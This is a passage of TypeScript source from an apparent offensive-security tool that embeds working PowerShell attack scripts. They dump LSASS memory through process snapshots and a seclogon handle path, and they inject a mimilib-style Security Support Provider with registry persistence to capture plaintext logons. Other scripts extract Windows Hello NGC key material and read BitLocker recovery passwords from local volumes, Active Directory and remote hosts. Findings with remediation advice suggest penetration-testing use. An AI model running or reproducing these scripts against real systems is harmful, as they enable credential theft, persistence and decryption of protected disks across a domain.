    public static extern uint PssCaptureSnapshot(
        IntPtr processHandle,
        uint captureFlags,
        uint threadContextFlags,
        out IntPtr snapshotHandle
    );

    [DllImport("kernel32.dll")]
    public static extern uint PssFreeSnapshot(IntPtr processHandle, IntPtr snapshotHandle);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint processId, IntPtr hFile,
        uint dumpType, IntPtr exceptionParam,
        IntPtr userStreamParam, IntPtr callbackParam
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFileW(
        [MarshalAs(UnmanagedType.LPWStr)] string filename,
        uint access, uint share, IntPtr security,
        uint creation, uint flags, IntPtr template
    );

    public const uint PSS_CAPTURE_VA_CLONE = 0x00000001;
    public const uint PSS_CAPTURE_HANDLES = 0x00000004;
    public const uint PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008;
    public const uint PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010;
    public const uint PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020;
    public const uint PSS_CAPTURE_VA_SPACE = 0x00000002;
    public const uint PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00000040;
    public const uint PSS_CREATE_MEASURE_PERFORMANCE = 0x00000080;
}
"@

$lsassPid = (Get-Process lsass).Id
Write-Output "[+] LSASS PID: $lsassPid"

# Need PROCESS_ALL_ACCESS for snapshot
$hLsass = [SnapshotDump]::OpenProcess(0x1F0FFF, $false, $lsassPid)
if ($hLsass -eq [IntPtr]::Zero) {
    Write-Output "[!] Cannot open LSASS with full access"
    exit 1
}

# Capture snapshot
$hSnapshot = [IntPtr]::Zero
$flags = [SnapshotDump]::PSS_CAPTURE_VA_CLONE -bor [SnapshotDump]::PSS_CAPTURE_VA_SPACE
$snapshotResult = [SnapshotDump]::PssCaptureSnapshot($hLsass, $flags, 0, [ref]$hSnapshot)

if ($snapshotResult -ne 0) {
    Write-Output "[!] PssCaptureSnapshot failed: 0x$($snapshotResult.ToString('X8'))"
    [SnapshotDump]::CloseHandle($hLsass) | Out-Null
    exit 1
}
Write-Output "[+] LSASS snapshot captured: $hSnapshot"

# Dump the snapshot
$hFile = [SnapshotDump]::CreateFileW("${outfile.replace(/\\/g, "\\\\")}", 0x40000000, 0, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)
$dumpResult = [SnapshotDump]::MiniDumpWriteDump($hSnapshot, [uint32]$lsassPid, $hFile, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
[SnapshotDump]::CloseHandle($hFile) | Out-Null
[SnapshotDump]::PssFreeSnapshot($hLsass, $hSnapshot) | Out-Null
[SnapshotDump]::CloseHandle($hLsass) | Out-Null

if ($dumpResult) {
    $size = (Get-Item "${outfile.replace(/\\/g, "\\\\")}").Length
    Write-Output "[+] LSASS snapshot dumped successfully!"
    Write-Output "    File: ${outfile}"
    Write-Output "    Size: $size bytes"
} else {
    Write-Output "[!] MiniDumpWriteDump failed on snapshot"
}
`,
    ssp: `
# SSP Injection: Register custom Security Package to intercept credentials
Write-Output "[*] Method: SSP Injection (AddSecurityPackage)"
Write-Output "[*] Registers a custom Security Support Provider to intercept future logon credentials"
Write-Output "[!] This method captures NEW logons, not existing cached credentials"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class SSPInject {
    [DllImport("secur32.dll")]
    public static extern int AddSecurityPackage(
        string pszPackageName,
        IntPtr pOptions  // SECURITY_PACKAGE_OPTIONS
    );

    [DllImport("secur32.dll")]
    public static extern int EnumerateSecurityPackages(
        out int pcPackages,
        out IntPtr ppPackageInfo
    );

    [DllImport("secur32.dll")]
    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
}
"@

# List current security packages
$numPackages = 0
$packageInfo = [IntPtr]::Zero
[SSPInject]::EnumerateSecurityPackages([ref]$numPackages, [ref]$packageInfo) | Out-Null
Write-Output "[+] Current security packages: $numPackages"
[SSPInject]::FreeContextBuffer($packageInfo) | Out-Null

# Create a minimal SSP DLL that logs credentials
# Using mimilib.dll pattern — writes plaintext creds to kiwissp.log
$sspLog = "${outfile.replace(/\.dmp$/, ".log")}"
Write-Output "[*] SSP will log credentials to: $sspLog"

# Check if mimilib.dll or similar SSP exists
$sspPaths = @(
    "$env:TEMP\\mimilib.dll",
    "C:\\Windows\\System32\\mimilib.dll",
    "$env:TEMP\\cs-ssp.dll"
)
$existingSSP = $sspPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($existingSSP) {
    Write-Output "[+] Found SSP DLL: $existingSSP"
    $sspResult = [SSPInject]::AddSecurityPackage($existingSSP, [IntPtr]::Zero)
    if ($sspResult -eq 0) {
        Write-Output "[+] SSP registered successfully!"
        Write-Output "[+] Credentials from new logons will be logged"
    } else {
        Write-Output "[!] AddSecurityPackage failed: 0x$($sspResult.ToString('X8'))"
    }
} else {
    Write-Output "[-] No SSP DLL found — need to provide one"
    Write-Output "[*] Alternative: Use registry persistence"
    Write-Output "[*] Adding to Security Packages registry key..."

    # Registry-based SSP persistence (survives reboot)
    $existingPackages = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "Security Packages")."Security Packages"
    Write-Output "[+] Current Security Packages: $($existingPackages -join ', ')"
    Write-Output ""
    Write-Output "[*] To add a custom SSP:"
    Write-Output '    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -Value ($existingPackages + "mimilib")'
    Write-Output "    # Then copy mimilib.dll to C:\\Windows\\System32\\"
    Write-Output "    # Credentials logged to C:\\Windows\\System32\\kiwissp.log on next logon"
}
`,
    seclogon: `
# Seclogon Handle Leak: Abuse Secondary Logon service to get LSASS handle
Write-Output "[*] Method: Secondary Logon Handle Leak"
Write-Output "[*] Uses CreateProcessWithLogonW to leak a handle to LSASS"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class SeclogonLeak {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithLogonW(
        string lpUsername, string lpDomain, string lpPassword,
        uint dwLogonFlags, string lpApplicationName, string lpCommandLine,
        uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern bool DuplicateHandle(
        IntPtr hSourceProcess, IntPtr hSourceHandle,
        IntPtr hTargetProcess, out IntPtr hTargetHandle,
        uint desiredAccess, bool inheritHandle, uint options
    );

    [DllImport("dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess, uint processId, IntPtr hFile,
        uint dumpType, IntPtr exceptionParam,
        IntPtr userStreamParam, IntPtr callbackParam
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateFileW(
        [MarshalAs(UnmanagedType.LPWStr)] string filename,
        uint access, uint share, IntPtr security,
        uint creation, uint flags, IntPtr template
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
}
"@

$lsassPid = (Get-Process lsass).Id
Write-Output "[+] LSASS PID: $lsassPid"

# Check if seclogon service is running
$seclogon = Get-Service seclogon -ErrorAction SilentlyContinue
if ($seclogon.Status -ne "Running") {
    Write-Output "[*] Starting Secondary Logon service..."
    Start-Service seclogon -ErrorAction SilentlyContinue
}
Write-Output "[+] Secondary Logon service: $($seclogon.Status)"

# Try direct handle with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
$hLsass = [SeclogonLeak]::OpenProcess(0x0410, $false, $lsassPid)
if ($hLsass -ne [IntPtr]::Zero) {
    Write-Output "[+] Got LSASS handle via OpenProcess: $hLsass"

    $hFile = [SeclogonLeak]::CreateFileW("${outfile.replace(/\\/g, "\\\\")}", 0x40000000, 0, [IntPtr]::Zero, 2, 0x80, [IntPtr]::Zero)
    $dumpResult = [SeclogonLeak]::MiniDumpWriteDump($hLsass, [uint32]$lsassPid, $hFile, 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    [SeclogonLeak]::CloseHandle($hFile) | Out-Null
    [SeclogonLeak]::CloseHandle($hLsass) | Out-Null

    if ($dumpResult) {
        $size = (Get-Item "${outfile.replace(/\\/g, "\\\\")}").Length
        Write-Output "[+] LSASS dumped via seclogon handle leak!"
        Write-Output "    File: ${outfile}"
        Write-Output "    Size: $size bytes"
    } else {
        Write-Output "[!] MiniDumpWriteDump failed — LSASS may be PPL protected"
    }
} else {
    Write-Output "[!] Cannot open LSASS directly — PPL or EDR blocking"
    Write-Output "[*] For PPL bypass, try fork method or use a signed vulnerable driver"
}
`,
  }

  const script = methods[method]
  if (!script) return { output: `[!] Unknown method: ${method}. Use: fork, snapshot, ssp, seclogon`, findings }

  const result = await ps(script, timeout)
  output.push(result.stdout)

  if (result.stdout.includes("dumped successfully") || result.stdout.includes("dumped via")) {
    findings.push({
      checkId: "WIN-NANO-001",
      provider: "windows",
      severity: "critical",
      status: "DUMPED",
      resource: "process://lsass",
      title: `LSASS dumped via ${method} (EDR bypass)`,
      details: `LSASS memory dumped to ${outfile} using ${method} technique. Parse with: mimikatz # sekurlsa::minidump ${outfile}`,
      remediation: `Enable Credential Guard. Enable LSASS PPL (RunAsPPL=1). Monitor for ${method === "fork" ? "NtCreateProcessEx with LSASS parent" : method === "snapshot" ? "PssCaptureSnapshot calls on LSASS" : method === "ssp" ? "AddSecurityPackage and new Security Packages in registry" : "Secondary Logon service abuse and handle duplication"}`,
    })
  } else if (result.stdout.includes("SSP registered")) {
    findings.push({
      checkId: "WIN-NANO-002",
      provider: "windows",
      severity: "critical",
      status: "INJECTED",
      resource: "lsa://security-packages",
      title: "Custom SSP registered for credential interception",
      details:
        "Security Support Provider injected via AddSecurityPackage. New logon credentials will be captured in plaintext",
      remediation:
        "Monitor LSA Security Packages registry key. Alert on AddSecurityPackage API calls. Enable Credential Guard",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function winHelloDump(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const user = argVal(args, "--user")
  const findings: Finding[] = []
  const output: string[] = ["[*] Windows Hello credential extraction...\n"]

  if (action === "enum") {
    const script = `
Write-Output "=== Windows Hello Enrollment Status ==="
Write-Output ""
# Check Windows Hello status via dsregcmd
$dsreg = dsregcmd /status 2>&1
$ngcSet = ($dsreg | Select-String 'NgcSet\s*:\s*(\w+)').Matches.Groups[1].Value
Write-Output "NGC (Next Generation Credential) Set: $ngcSet"
# Check Windows Hello containers
Write-Output ""
Write-Output "--- NGC Key Containers ---"
$ngcPath = "$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc"
if (Test-Path $ngcPath) {
  $ngcDirs = Get-ChildItem $ngcPath -Directory -ErrorAction SilentlyContinue
  Write-Output "NGC containers found: $($ngcDirs.Count)"
  foreach ($d in $ngcDirs) {
    Write-Output "  Container: $($d.Name)"
    $protectorFile = Get-ChildItem "$($d.FullName)\\Protectors" -ErrorAction SilentlyContinue
    $keyFiles = Get-ChildItem "$($d.FullName)" -Recurse -File -ErrorAction SilentlyContinue
    Write-Output "    Files: $($keyFiles.Count)"
    Write-Output "    Protectors: $($protectorFile.Count)"
    Write-Output "    Created: $($d.CreationTime)"
    Write-Output "    Modified: $($d.LastWriteTime)"
    # Check for 1.dat (encrypted key) and 2.dat (DPAPI master key reference)
    if (Test-Path "$($d.FullName)\\1.dat") {
      Write-Output "    [+] NGC key data file found (1.dat)"
    }
  }
} else {
  Write-Output "NGC path not found — Windows Hello may not be configured"
}
# Check per-user enrollment
Write-Output ""
Write-Output "--- Per-User Hello Enrollment ---"
$profiles = Get-ChildItem "$env:SystemDrive\\Users" -Directory -ErrorAction SilentlyContinue
foreach ($p in $profiles) {
  ${user ? `if ($p.Name -ne '${user}') { continue }` : ""}
  $userNgc = "$($p.FullName)\\AppData\\Local\\Microsoft\\Ngc"
  if (Test-Path $userNgc) {
    Write-Output "  $($p.Name): Windows Hello ENROLLED"
  }
  # Check FIDO2 keys
  $fidoPath = "$($p.FullName)\\AppData\\Local\\Microsoft\\Fido"
  if (Test-Path $fidoPath) {
    Write-Output "  $($p.Name): FIDO2 security key registered"
  }
}
# Biometric status
Write-Output ""
Write-Output "--- Biometric Devices ---"
$bio = Get-WmiObject -Class Win32_BiometricDevice -ErrorAction SilentlyContinue
if ($bio) {
  foreach ($b in $bio) {
    Write-Output "  $($b.Caption) — $($b.Manufacturer)"
  }
} else {
  # Try WinBio service
  $winbioService = Get-Service -Name WbioSrvc -ErrorAction SilentlyContinue
  Write-Output "WinBio Service: $(if ($winbioService) {$winbioService.Status} else {'Not found'})"
}
# Azure AD / WHfB Key Trust vs Certificate Trust
Write-Output ""
Write-Output "--- Windows Hello for Business Type ---"
$whfbType = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" -Name "UseCloudTrustForOnPremAuth" -ErrorAction SilentlyContinue).UseCloudTrustForOnPremAuth
$certTrust = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\PassportForWork" -Name "UseCertificateForOnPremAuth" -ErrorAction SilentlyContinue).UseCertificateForOnPremAuth
Write-Output "Cloud Trust: $(if ($whfbType -eq 1) {'Enabled'} else {'Disabled/Not configured'})"
Write-Output "Certificate Trust: $(if ($certTrust -eq 1) {'Enabled'} else {'Disabled/Not configured'})"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("[+] NGC key data file found")) {
      findings.push({
        checkId: "HELLO-001",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "Windows Hello NGC",
        title: "Windows Hello NGC key containers accessible",
        details: "NGC key data files can be extracted and decrypted via DPAPI for credential recovery",
        remediation: "Enable Credential Guard to protect NGC keys with VBS.",
      })
    }
  }

  if (action === "keys") {
    const script = `
Write-Output "=== Windows Hello Key Extraction ==="
Write-Output ""
# Extract NGC key material
$ngcPath = "$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc"
if (-not (Test-Path $ngcPath)) {
  Write-Output "NGC path not found"
  return
}
$containers = Get-ChildItem $ngcPath -Directory -ErrorAction SilentlyContinue
foreach ($c in $containers) {
  Write-Output "[*] Container: $($c.Name)"
  # Read key data
  $keyFile = "$($c.FullName)\\1.dat"
  if (Test-Path $keyFile) {
    $keyData = [System.IO.File]::ReadAllBytes($keyFile)
    Write-Output "  Key data: $($keyData.Length) bytes"
    Write-Output "  Key header: $([BitConverter]::ToString($keyData[0..15]))"
  }
  # Read protector info
  $protectorDir = "$($c.FullName)\\Protectors"
  if (Test-Path $protectorDir) {
    $protectors = Get-ChildItem $protectorDir -Directory
    foreach ($p in $protectors) {
      Write-Output "  Protector: $($p.Name)"
      $protData = Get-ChildItem "$($p.FullName)" -File -ErrorAction SilentlyContinue
      foreach ($f in $protData) {
        Write-Output "    $($f.Name): $($f.Length) bytes"
      }
    }
  }
  # Check CryptoAPI key containers
  Write-Output ""
  Write-Output "  --- Associated CNG Keys ---"
  $cngPath = "$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys"
  if (Test-Path $cngPath) {
    $cngKeys = Get-ChildItem $cngPath -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 5
    foreach ($k in $cngKeys) {
      Write-Output "    $($k.Name) — $($k.Length) bytes — $($k.LastWriteTime)"
    }
  }
  Write-Output ""
}
Write-Output "--- DPAPI Decryption ---"
Write-Output "NGC keys are protected by DPAPI. To decrypt:"
Write-Output "  1. Extract DPAPI master keys: winhook dpapi_extract"
Write-Output "  2. If domain-joined: winhook dpapi_domain (domain backup key)"
Write-Output "  3. Decrypted NGC key enables pass-the-certificate attacks"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "pin-policy") {
    const script = `
Write-Output "=== Windows Hello PIN Policy ==="
Write-Output ""
$policyPath = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\PassportForWork\\PINComplexity"
$minLength = (Get-ItemProperty $policyPath -Name "MinimumPINLength" -ErrorAction SilentlyContinue).MinimumPINLength
$maxLength = (Get-ItemProperty $policyPath -Name "MaximumPINLength" -ErrorAction SilentlyContinue).MaximumPINLength
$uppercase = (Get-ItemProperty $policyPath -Name "RequireUppercase" -ErrorAction SilentlyContinue).RequireUppercase
$lowercase = (Get-ItemProperty $policyPath -Name "RequireLowercase" -ErrorAction SilentlyContinue).RequireLowercase
$digits = (Get-ItemProperty $policyPath -Name "RequireDigits" -ErrorAction SilentlyContinue).RequireDigits
$special = (Get-ItemProperty $policyPath -Name "RequireSpecialCharacters" -ErrorAction SilentlyContinue).RequireSpecialCharacters
$history = (Get-ItemProperty $policyPath -Name "History" -ErrorAction SilentlyContinue).History
$expiry = (Get-ItemProperty $policyPath -Name "Expiration" -ErrorAction SilentlyContinue).Expiration
Write-Output "Min Length: $(if ($minLength) {$minLength} else {'4 (default)'})"
Write-Output "Max Length: $(if ($maxLength) {$maxLength} else {'127 (default)'})"
Write-Output "Require Uppercase: $(if ($uppercase -eq 1) {'Yes'} elseif ($uppercase -eq 2) {'No'} else {'Not configured'})"
Write-Output "Require Lowercase: $(if ($lowercase -eq 1) {'Yes'} elseif ($lowercase -eq 2) {'No'} else {'Not configured'})"
Write-Output "Require Digits: $(if ($digits -eq 1) {'Yes'} elseif ($digits -eq 2) {'No'} else {'Required (default)'})"
Write-Output "Require Special: $(if ($special -eq 1) {'Yes'} elseif ($special -eq 2) {'No'} else {'Not configured'})"
Write-Output "History: $(if ($history) {$history} else {'Not configured'})"
Write-Output "Expiry (days): $(if ($expiry) {$expiry} else {'Never (default)'})"
Write-Output ""
if (-not $minLength -or $minLength -lt 6) {
  Write-Output "[!] PIN length requirement is weak — brute force feasible"
  Write-Output "    4-digit PIN = 10,000 combinations (trivial)"
  Write-Output "    6-digit PIN = 1,000,000 combinations (still feasible)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stdout.includes("brute force feasible")) {
      findings.push({
        checkId: "HELLO-002",
        provider: "winhook",
        severity: "medium",
        status: "FAIL",
        resource: "Windows Hello PIN Policy",
        title: "Weak PIN policy — brute force feasible",
        details: "PIN length and complexity requirements are insufficient to prevent brute force",
        remediation: "Set minimum PIN length to 6+ and require mixed character types via GPO.",
      })
    }
  }

  if (action === "biometric") {
    const script = `
Write-Output "=== Biometric Enrollment Details ==="
Write-Output ""
# WinBio database
$bioDbPath = "$env:SystemRoot\\System32\\WinBioDatabase"
if (Test-Path $bioDbPath) {
  $bioFiles = Get-ChildItem $bioDbPath -ErrorAction SilentlyContinue
  Write-Output "Biometric database files: $($bioFiles.Count)"
  foreach ($f in $bioFiles) {
    Write-Output "  $($f.Name) — $([math]::Round($f.Length/1KB, 1)) KB — $($f.LastWriteTime)"
  }
} else {
  Write-Output "No biometric database found"
}
Write-Output ""
# WinBio configuration
Write-Output "--- WinBio Configuration ---"
$bioConfig = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WbioSrvc" -ErrorAction SilentlyContinue
Write-Output "Service Start: $(switch ($bioConfig.Start) {2 {'Automatic'} 3 {'Manual'} 4 {'Disabled'} default {'Unknown'}})"
$bioSensors = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WinBio\\*" -ErrorAction SilentlyContinue
if ($bioSensors) {
  Write-Output "Registered sensors:"
  foreach ($s in $bioSensors) {
    Write-Output "  $($s.PSChildName)"
  }
}
# Face recognition (Windows Hello Face)
Write-Output ""
Write-Output "--- Facial Recognition ---"
$irCamera = Get-PnpDevice -Class Camera -ErrorAction SilentlyContinue | Where-Object { $_.FriendlyName -match 'IR|Infrared|Hello' }
if ($irCamera) {
  Write-Output "IR Camera: $($irCamera.FriendlyName) — Status: $($irCamera.Status)"
} else {
  Write-Output "No IR camera detected for facial recognition"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "fido") {
    const script = `
Write-Output "=== FIDO2 Security Key Enumeration ==="
Write-Output ""
# Enumerate registered FIDO2 keys
$fidoPath = "$env:LOCALAPPDATA\\Microsoft\\Fido"
if (Test-Path $fidoPath) {
  $fidoFiles = Get-ChildItem $fidoPath -Recurse -ErrorAction SilentlyContinue
  Write-Output "FIDO2 registration files: $($fidoFiles.Count)"
  foreach ($f in $fidoFiles) {
    Write-Output "  $($f.Name) — $($f.LastWriteTime)"
  }
} else {
  Write-Output "No FIDO2 registrations found for current user"
}
# Check WebAuthn
Write-Output ""
Write-Output "--- WebAuthn (Platform) ---"
$webauthn = Get-Item "HKLM:\\SOFTWARE\\Microsoft\\WebAuthn" -ErrorAction SilentlyContinue
if ($webauthn) {
  Write-Output "WebAuthn registry key present"
  $props = Get-ItemProperty $webauthn.PSPath
  $props.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
    Write-Output "  $($_.Name): $($_.Value)"
  }
}
# Check passkeys
Write-Output ""
Write-Output "--- Passkeys (Windows 23H2+) ---"
$passkeysPath = "$env:LOCALAPPDATA\\Microsoft\\Passkeys"
if (Test-Path $passkeysPath) {
  Write-Output "Passkeys directory found"
  $pkFiles = Get-ChildItem $passkeysPath -Recurse -ErrorAction SilentlyContinue
  foreach ($f in $pkFiles) {
    Write-Output "  $($f.Name)"
  }
} else {
  Write-Output "No passkeys directory (Windows 23H2+ feature)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function bitlockerKeys(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "local"
  const target = argVal(args, "--target")
  const computer = argVal(args, "--computer")
  const volume = argVal(args, "--volume") || "C:"
  const findings: Finding[] = []
  const output: string[] = ["[*] BitLocker recovery key extraction...\n"]

  if (action === "local") {
    const script = `
Write-Output "=== Local BitLocker Status ==="
Write-Output ""
# Enumerate encrypted volumes
$volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue
if (-not $volumes) {
  Write-Output "BitLocker not active or Get-BitLockerVolume not available"
  Write-Output "Trying WMI method..."
  $wmiVolumes = Get-WmiObject -Namespace "Root\\CIMV2\\Security\\MicrosoftVolumeEncryption" -Class Win32_EncryptableVolume -ErrorAction SilentlyContinue
  if ($wmiVolumes) {
    foreach ($v in $wmiVolumes) {
      $status = switch ($v.GetProtectionStatus().ProtectionStatus) { 0 {"Unprotected"} 1 {"Protected"} 2 {"Unknown"} }
      Write-Output "Volume: $($v.DriveLetter) — Status: $status"
      if ($v.GetProtectionStatus().ProtectionStatus -eq 1) {
        # Try to get recovery key
        $keyProtectors = $v.GetKeyProtectors(3)
        if ($keyProtectors.VolumeKeyProtectorID) {
          foreach ($kpId in $keyProtectors.VolumeKeyProtectorID) {
            $rp = $v.GetKeyProtectorNumericalPassword($kpId)
            if ($rp.NumericalPassword) {
              Write-Output "[+] Recovery Password: $($rp.NumericalPassword)"
              Write-Output "    Protector ID: $kpId"
            }
          }
        }
      }
    }
  } else {
    Write-Output "No encrypted volumes found via WMI"
  }
  return
}
foreach ($v in $volumes) {
  Write-Output "Volume: $($v.MountPoint)"
  Write-Output "  Status: $($v.VolumeStatus)"
  Write-Output "  Protection: $($v.ProtectionStatus)"
  Write-Output "  Encryption: $($v.EncryptionPercentage)%"
  Write-Output "  Lock Status: $($v.LockStatus)"
  Write-Output "  Key Protectors:"
  foreach ($kp in $v.KeyProtector) {
    Write-Output "    Type: $($kp.KeyProtectorType)"
    Write-Output "    ID: $($kp.KeyProtectorId)"
    if ($kp.RecoveryPassword) {
      Write-Output "    [+] RECOVERY PASSWORD: $($kp.RecoveryPassword)"
    }
    if ($kp.KeyFileName) {
      Write-Output "    Key File: $($kp.KeyFileName)"
    }
  }
  Write-Output ""
}
# Check if protection is suspended (keys in cleartext memory)
$suspended = $volumes | Where-Object { $_.ProtectionStatus -eq 'Off' -and $_.VolumeStatus -eq 'FullyEncrypted' }
if ($suspended) {
  Write-Output "[!] WARNING: BitLocker protection SUSPENDED on:"
  foreach ($s in $suspended) {
    Write-Output "    $($s.MountPoint) — keys in cleartext memory until reboot"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    const recoveryMatches = r.stdout.match(/RECOVERY PASSWORD: .+/g) || []
    for (const rk of recoveryMatches) {
      findings.push({
        checkId: "BITL-001",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "BitLocker",
        title: "BitLocker recovery password extracted",
        details: rk,
        remediation: "Rotate BitLocker recovery keys, restrict admin access.",
      })
    }
    if (r.stdout.includes("protection SUSPENDED")) {
      findings.push({
        checkId: "BITL-002",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "BitLocker Suspended",
        title: "BitLocker protection suspended — cleartext keys in memory",
        details: "Volume encryption keys are in cleartext memory until protection is resumed or device reboots",
        remediation: "Resume BitLocker protection: Resume-BitLocker -MountPoint C:",
      })
    }
  }

  if (action === "ad") {
    const computerFilter = computer ? `(cn=${computer.replace(/\$$/, "")})` : "(objectCategory=computer)"
    const script = `
Write-Output "=== BitLocker Recovery Keys from Active Directory ==="
Write-Output ""
Write-Output "Searching for msFVE-RecoveryInformation objects..."
Write-Output ""
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=msFVE-RecoveryInformation)"
$searcher.PageSize = 1000
$searcher.PropertiesToLoad.AddRange(@("msFVE-RecoveryPassword","msFVE-VolumeGuid","whenCreated","distinguishedName"))
$keys = $searcher.FindAll()
Write-Output "Recovery keys found in AD: $($keys.Count)"
Write-Output ""
foreach ($k in $keys) {
  $dn = $k.Properties["distinguishedname"][0]
  $computerDn = ($dn -split ',',2)[1]
  $computerCn = ($computerDn -split ',')[0] -replace 'CN=',''
  $recoveryPwd = $k.Properties["msfve-recoverypassword"][0]
  $volumeGuid = $k.Properties["msfve-volumeguid"][0]
  $created = $k.Properties["whencreated"][0]
  ${computer ? `if ($computerCn -ne '${computer.replace(/\$$/, "")}') { continue }` : ""}
  Write-Output "[+] Computer: $computerCn"
  Write-Output "    Recovery Password: $recoveryPwd"
  Write-Output "    Volume GUID: $volumeGuid"
  Write-Output "    Stored: $created"
  Write-Output ""
}
if ($keys.Count -eq 0) {
  Write-Output "No BitLocker recovery keys stored in AD"
  Write-Output "This may mean:"
  Write-Output "  - BitLocker is not deployed"
  Write-Output "  - Keys are not backed up to AD (GPO not configured)"
  Write-Output "  - You lack read permissions on msFVE-RecoveryInformation"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    const adKeyMatches = r.stdout.match(/\[\+\] Computer: .+/g) || []
    if (adKeyMatches.length > 0) {
      findings.push({
        checkId: "BITL-003",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "AD BitLocker Keys",
        title: `${adKeyMatches.length} BitLocker recovery key(s) extracted from AD`,
        details: "Recovery keys stored in msFVE-RecoveryInformation objects are readable with domain credentials",
        remediation: "Restrict read permissions on msFVE-RecoveryInformation objects to authorized admins only.",
      })
    }
  }

  if (action === "remote") {
    if (!target) {
      output.push("ERROR: --target required for remote action")
      return { output: output.join("\n"), findings }
    }
    const script = `
Write-Output "=== Remote BitLocker Status: ${target} ==="
Write-Output ""
try {
  $volumes = Get-BitLockerVolume -ComputerName '${target}' -ErrorAction Stop
  foreach ($v in $volumes) {
    Write-Output "Volume: $($v.MountPoint)"
    Write-Output "  Protection: $($v.ProtectionStatus)"
    Write-Output "  Key Protectors:"
    foreach ($kp in $v.KeyProtector) {
      Write-Output "    Type: $($kp.KeyProtectorType)"
      if ($kp.RecoveryPassword) {
        Write-Output "    [+] RECOVERY PASSWORD: $($kp.RecoveryPassword)"
      }
    }
    Write-Output ""
  }
} catch {
  Write-Output "Remote query failed: $_"
  Write-Output "Trying WMI..."
  try {
    $wmi = Get-WmiObject -Namespace "Root\\CIMV2\\Security\\MicrosoftVolumeEncryption" -Class Win32_EncryptableVolume -ComputerName '${target}'
    foreach ($v in $wmi) {
      $status = switch ($v.GetProtectionStatus().ProtectionStatus) { 0 {"Off"} 1 {"On"} }
      Write-Output "  $($v.DriveLetter): Protection $status"
    }
  } catch {
    Write-Output "WMI also failed: $_"
    Write-Output "Check AD instead: winhook bitlocker_keys --action ad --computer ${target}"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "enum") {
    const script = `
Write-Output "=== BitLocker Deployment Enumeration ==="
Write-Output ""
# Check GPO for BitLocker backup policy
Write-Output "--- BitLocker GPO Settings (local) ---"
$gpoPath = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\FVE"
